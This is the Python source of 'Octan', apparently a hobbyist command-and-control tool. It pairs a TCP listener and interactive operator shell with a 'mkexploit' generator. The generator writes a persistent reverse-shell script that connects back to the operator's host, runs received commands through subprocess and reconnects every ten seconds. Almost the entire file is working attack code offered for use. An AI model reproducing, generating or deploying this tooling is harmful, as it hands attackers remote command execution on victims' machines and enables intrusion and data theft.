import sys
import nclib
import socket
import datetime
from colorama import Fore, Back

ADDR, PORT, SEP = "", "", ""

conn = None

class utils:
    def getspaces(strin, lenin):
        result = strin
        while result.__len__() < lenin:
            result += " "
        return result

class octan_shell:
    def grab_prompt():
        global conn
        return f"{Fore.BLUE}[{str(conn)}] {Fore.YELLOW}>>{Fore.RESET} "

    def main():
        while True:
            cmd_input = input(octan_shell.grab_prompt())
            cmd_split = cmd_input.split()
            cmd = cmd_split[0]

            cmd_clean = cmd.strip().lower()

            if cmd_clean == "exploit":
                TARGET = None
                
                try:
                    TARGET = cmd_split[1]
                except:
                    pass

                global ADDR
                global PORT
                global SEP

                octan.listen(ADDR, PORT, SEP, TARGET)
            elif cmd_clean == "mkexploit":
                if cmd_split.__len__() >= 2:
                    octan.mkexploit(f"{cmd_split[1]}:{PORT}/{SEP}")
                else:
                    print(f"{Fore.RED}[-]{Fore.RESET} Usage: mkexploit <public_addr>")
                print()
            elif cmd_clean == "show":
                octan.show()
            elif cmd_clean == "help":
                octan.help()

class octan:
    def listen(ADDR, PORT, SEP, TARGET, printf=True):
        global conn
        server = nclib.TCPServer((ADDR, int(PORT)))
        if printf:
            print(f"{Fore.BLUE}[*]{Fore.RESET} Starting {Fore.BLUE}/tcp/sever/{Fore.RESET} on port {Fore.GREEN}{PORT}{Fore.RESET}")
            print(f"{Fore.BLUE}[*]{Fore.RESET} Waiting for a Conneciton from {Fore.BLUE}{TARGET}{Fore.RESET}\n")
        
        for client in server:
            if TARGET != None:
                if TARGET == client.peer[0]:
                    conn = client.peer[0]
                else:
                    server.close()
                    octan.listen(ADDR, PORT, SEP, TARGET, printf=False)
            else:
                conn = client.peer[0]
            
            print(f"{Fore.GREEN}[+]{Fore.RESET} Connecting to {Fore.BLUE}{conn}{Fore.RESET}")
                
            command = ""

            while command != "exit":
                try:
                    data = client.read_until(SEP)
                    result = data.decode('utf-8')
                    result = result[0:result.__len__() - 1]

                    print(result) 

                    print()
                    command = ""
                    while len(command) <= 0:
                        command = input(octan_shell.grab_prompt())
                    
                    client.writeln(command)
                except KeyboardInterrupt:
                    break
                except BrokenPipeError:
                    pass    
            break
        conn = None

    def show():
        global ADDR
        global PORT

        TCP_IP = ADDR
        TCP_PORT = int(PORT)
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)         
        server.bind((TCP_IP, TCP_PORT))
        server.listen()
            
        print()
        try:
            print(f" {Fore.GREEN}   IPAddress     {Fore.WHITE}| {Fore.GREEN}     Date/Time{Fore.WHITE}      | {Fore.GREEN}INFO{Fore.WHITE}")
            print(f" ------------------------------------------------")
            while True:
                conn, addr = server.accept()
                info = conn.recv(1024)
                ipaddr = addr[0]
                datet = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                fat = (str(info.decode()))[0:str(info.decode()).__len__() -1]
                print(f"  {Fore.BLUE}{utils.getspaces(ipaddr, 15)}{Fore.WHITE} | {Fore.YELLOW}{datet}{Fore.WHITE} | {Fore.MAGENTA}{fat}{Fore.WHITE}")
                conn.close()

        except KeyboardInterrupt:
            print()
            pass

    def help():
        print(""" 
COMMAND                      | HELP_TEXT
----------------------------------
exploit <TARGET>        <nr> | Run tcp/listener
mkexploit <PUBLIC_ADDR> <r>  | Create simple reverse shell (exploit_.py)
show <>                 <nr> | display all incoming connections

        """)

    def mkexploit(payload):
        addr, port, sep = "", "", "" 
        
        try:
            ip = payload.split(':')[0]

            port_sep = payload.split(':')[1]

            port =    port_sep.split('/')[0]
            sep  =    port_sep.split('/')[1]

            addr, port, sep = ip, port, sep
        except:
            print(f"{Fore.RED}[-]{Fore.RESET} PAYLOAD is not in the correct format!")
            return
        
        exploit = f"""import os
import sys
import time
import socket
import subprocess

from colorama import Fore, Back

SERVER_HOST = "{addr}"
SERVER_PORT = {port}
BUFFER_SIZE = 1024 * 128
SEPARATOR = "{sep}"

while True:
    try:
        s = socket.socket()
        s.connect((SERVER_HOST, SERVER_PORT))
        first_message = Fore.GREEN+"[+]"+Fore.RESET+" Spawning Shell..."+SEPARATOR
        s.send(first_message.encode())

        while True:
            try:
                command = s.recv(BUFFER_SIZE).decode()
                splited_command = command.split()
                if command.lower() == "exit":
                    break
                if splited_command[0].lower() == "cd":
                    try:
                        os.chdir(' '.join(splited_command[1:]))
                    except FileNotFoundError as e:
                        output = str(e)
                    else:
                        output = ""
                else:
                    output = subprocess.getoutput(command)
                message = output+SEPARATOR
                s.send(message.encode())
            except:
                break
    except:
        pass
    s.close()

    time.sleep(10)
        """

        file = open("exploit_.py", "w")
        n = file.write(exploit)
        file.close()

        print(f"{Fore.GREEN}[+]{Fore.RESET} Wrote to EXPLOIT to {Fore.BLUE}exploit_.py{Fore.RESET}")

class program:
    def octan(payload):
        global ADDR
        global PORT
        global SEP

        try:
            ip = payload.split(':')[0]

            port_sep = payload.split(':')[1]

            port =    port_sep.split('/')[0]
            sep  =    port_sep.split('/')[1]

            ADDR, PORT, SEP = ip, port, sep
        except:
            print(f"{Fore.RED}[-]{Fore.RESET} PAYLOAD is not in the correct format!")
            exit()
        print()

        

        # mkpayload 0.0.0.0:1338/<BEGIN::0cT4n::END>
        # show
        # exploit 192.168.0.1 or exploit

        octan_shell.main()
        # octan.listen(ADDR, PORT, SEP)

    def ascii_art(payload):
        return f""" 
{Fore.MAGENTA}   ,'""`.      {Fore.BLUE} _____ _____ _____ _____ _____ 
{Fore.MAGENTA}  / _  _ \     {Fore.BLUE}|     |     |_   _|  _  |   | | 
{Fore.MAGENTA}  |(@)(@)|     {Fore.BLUE}|  |  |   --| | | |     | | | | 
{Fore.MAGENTA}  )  __  (     {Fore.BLUE}|_____|_____| |_| |__|__|_|___| 
{Fore.MAGENTA} /,'))((`.\    
{Fore.MAGENTA}(( ((  )) ))   {Fore.GREEN}[+]{Fore.RESET} Running Octan on {Fore.YELLOW}v1.0.00
{Fore.MAGENTA} `\ `)(' /'    {Fore.RESET}{Fore.BLUE}[*]{Fore.RESET} Starting [{Fore.GREEN}{payload}{Fore.RESET}]
"""

    def main():
        default_payload = False
        conichiwa = b'\xe7\x9a\x84'.decode('utf8')
        payload = "0.0.0.0:1338/" + conichiwa
        
        try:
            payload = sys.argv[1]
        except:
            default_payload = True
            
        print(program.ascii_art(payload))
        
        if default_payload:
            print(f"{Fore.YELLOW}[!] [WARNING]{Fore.RESET} Selecting default payload")
        
        program.octan(payload)

if __name__ == "__main__":
    try:
        program.main()
    except KeyboardInterrupt:
        pass